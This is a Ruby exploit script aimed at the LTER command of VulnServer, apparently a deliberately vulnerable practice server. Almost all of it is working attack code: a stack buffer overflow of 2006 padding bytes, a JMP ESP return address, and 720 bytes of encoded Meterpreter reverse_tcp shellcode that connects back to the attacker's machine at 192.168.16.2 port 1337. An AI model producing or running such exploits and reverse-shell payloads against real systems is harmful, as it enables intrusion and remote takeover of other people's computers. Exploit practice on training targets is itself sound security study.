#! /usr/bin/env ruby
# VulnServer.exe LTER Exploit
# 
# Usage ./lter.rb <IP> <PORT> <PAYLOAD FILE>
#
require 'socket'

# Check arguments
if ARGV.length < 2
  puts "usage #{__FILE__} <target ip> <target port> <payload file>"
  exit
end

# Create the socket
IP = ARGV[0]
PORT = ARGV[1]

puts "[+] Connecting..."
s = TCPSocket.new(IP, PORT)

# Define command
cmd = "LTER ."

# Build payload
ret = "\x03\x12\x50\x62"    # 62501203  FFE4 JMP ESP 

# msfvenom -p windows/meterpreter/reverse_tcp -e x86/alpha_mixed
# -f ruby LHOST=192.168.16.2 LPORT=1337 BufferRegister=ESP
# x86/alpha_mixed chosen with final size 720
# Payload size: 720 bytes
shellcode = 
"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49" +
"\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30" +
"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42" +
"\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x6b\x4c\x59\x78" +
"\x6c\x42\x35\x50\x75\x50\x77\x70\x53\x50\x4c\x49\x4d\x35" +
"\x36\x51\x69\x50\x51\x74\x4e\x6b\x66\x30\x30\x30\x4e\x6b" +
"\x66\x32\x36\x6c\x6e\x6b\x53\x62\x77\x64\x6e\x6b\x34\x32" +
"\x34\x68\x44\x4f\x6e\x57\x31\x5a\x61\x36\x76\x51\x59\x6f" +
"\x4e\x4c\x45\x6c\x35\x31\x63\x4c\x45\x52\x74\x6c\x75\x70" +
"\x6b\x71\x4a\x6f\x36\x6d\x36\x61\x5a\x67\x6d\x32\x68\x72" +
"\x50\x52\x51\x47\x6e\x6b\x51\x42\x56\x70\x6e\x6b\x33\x7a" +
"\x65\x6c\x4c\x4b\x50\x4c\x52\x31\x50\x78\x79\x73\x51\x58" +
"\x67\x71\x4a\x71\x33\x61\x6e\x6b\x32\x79\x31\x30\x67\x71" +
"\x79\x43\x6c\x4b\x51\x59\x34\x58\x78\x63\x74\x7a\x72\x69" +
"\x6e\x6b\x45\x64\x4e\x6b\x37\x71\x79\x46\x44\x71\x79\x6f" +
"\x4e\x4c\x7a\x61\x7a\x6f\x34\x4d\x77\x71\x49\x57\x64\x78" +
"\x69\x70\x61\x65\x58\x76\x57\x73\x61\x6d\x79\x68\x35\x6b" +
"\x63\x4d\x54\x64\x42\x55\x78\x64\x56\x38\x4c\x4b\x50\x58" +
"\x36\x44\x75\x51\x4b\x63\x75\x36\x6c\x4b\x76\x6c\x70\x4b" +
"\x4c\x4b\x71\x48\x35\x4c\x43\x31\x69\x43\x6e\x6b\x65\x54" +
"\x4c\x4b\x76\x61\x4a\x70\x6b\x39\x70\x44\x47\x54\x45\x74" +
"\x71\x4b\x63\x6b\x53\x51\x61\x49\x42\x7a\x46\x31\x4b\x4f" +
"\x4d\x30\x61\x4f\x53\x6f\x51\x4a\x4c\x4b\x34\x52\x7a\x4b" +
"\x4e\x6d\x53\x6d\x63\x58\x44\x73\x35\x62\x47\x70\x35\x50" +
"\x43\x58\x33\x47\x34\x33\x65\x62\x63\x6f\x51\x44\x75\x38" +
"\x30\x4c\x54\x37\x65\x76\x34\x47\x6b\x4f\x5a\x75\x4f\x48" +
"\x4a\x30\x77\x71\x57\x70\x63\x30\x76\x49\x5a\x64\x53\x64" +
"\x72\x70\x71\x78\x76\x49\x6d\x50\x50\x6b\x77\x70\x39\x6f" +
"\x58\x55\x33\x5a\x77\x75\x35\x38\x4b\x70\x4d\x78\x62\x30" +
"\x37\x72\x32\x48\x54\x42\x33\x30\x74\x45\x77\x49\x6e\x69" +
"\x38\x66\x70\x50\x56\x30\x52\x70\x62\x70\x73\x70\x56\x30" +
"\x43\x70\x56\x30\x72\x48\x6a\x4a\x54\x4f\x59\x4f\x69\x70" +
"\x39\x6f\x39\x45\x6c\x57\x70\x6a\x32\x30\x31\x46\x62\x77" +
"\x52\x48\x7a\x39\x6e\x45\x51\x64\x75\x31\x39\x6f\x48\x55" +
"\x6e\x65\x59\x50\x43\x44\x64\x4a\x59\x6f\x30\x4e\x75\x58" +
"\x72\x55\x7a\x4c\x58\x68\x75\x31\x37\x70\x77\x70\x55\x50" +
"\x30\x6a\x55\x50\x72\x4a\x63\x34\x42\x76\x30\x57\x55\x38" +
"\x66\x62\x79\x49\x59\x58\x53\x6f\x49\x6f\x48\x55\x6b\x33" +
"\x78\x78\x55\x50\x71\x6e\x36\x56\x4c\x4b\x34\x76\x63\x5a" +
"\x71\x50\x35\x38\x37\x70\x44\x50\x65\x50\x63\x30\x31\x46" +
"\x62\x4a\x63\x30\x30\x68\x50\x58\x4e\x44\x61\x43\x68\x65" +
"\x6b\x4f\x68\x55\x4a\x33\x30\x53\x52\x4a\x35\x50\x52\x76" +
"\x31\x43\x73\x67\x62\x48\x56\x62\x4e\x39\x58\x48\x71\x4f" +
"\x49\x6f\x59\x45\x6d\x53\x4b\x48\x55\x50\x43\x4d\x34\x62" +
"\x43\x68\x72\x48\x47\x70\x71\x50\x63\x30\x55\x50\x73\x5a" +
"\x63\x30\x62\x70\x55\x38\x46\x6b\x34\x6f\x64\x4f\x54\x70" +
"\x79\x6f\x69\x45\x51\x47\x61\x78\x34\x35\x72\x4e\x32\x6d" +
"\x30\x61\x79\x6f\x59\x45\x63\x6e\x31\x4e\x69\x6f\x34\x4c" +
"\x76\x44\x68\x69\x42\x51\x79\x6f\x4b\x4f\x49\x6f\x76\x61" +
"\x39\x53\x47\x59\x58\x46\x32\x55\x58\x47\x78\x43\x6f\x4b" +
"\x6c\x30\x6c\x75\x39\x32\x31\x46\x30\x6a\x67\x70\x46\x33" +
"\x79\x6f\x4e\x35\x41\x41"

payload = "\x41" * 2006 + ret + shellcode

# Send the payload
begin
  s.gets
  puts "[+] Sending payload.."
  s.puts(cmd + payload)
  s.gets
  puts "[-] Failed to crash the target"
  s.close
rescue Errno::ECONNRESET
  puts "[+] Crash!!"
end

